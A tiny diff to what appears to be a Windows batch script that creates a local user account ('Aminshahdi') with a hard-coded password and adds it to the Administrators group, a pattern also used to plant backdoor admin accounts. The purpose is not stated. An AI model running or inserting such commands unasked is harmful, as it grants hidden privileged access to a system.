@@ -1,4 +1,4 @@
-net user Michael @Gddrgddgg0070 /add
+net user Aminshahdi @Gddrgddgg0070 /add
 
 net localgroup Administrators Aminshahdi/add
 
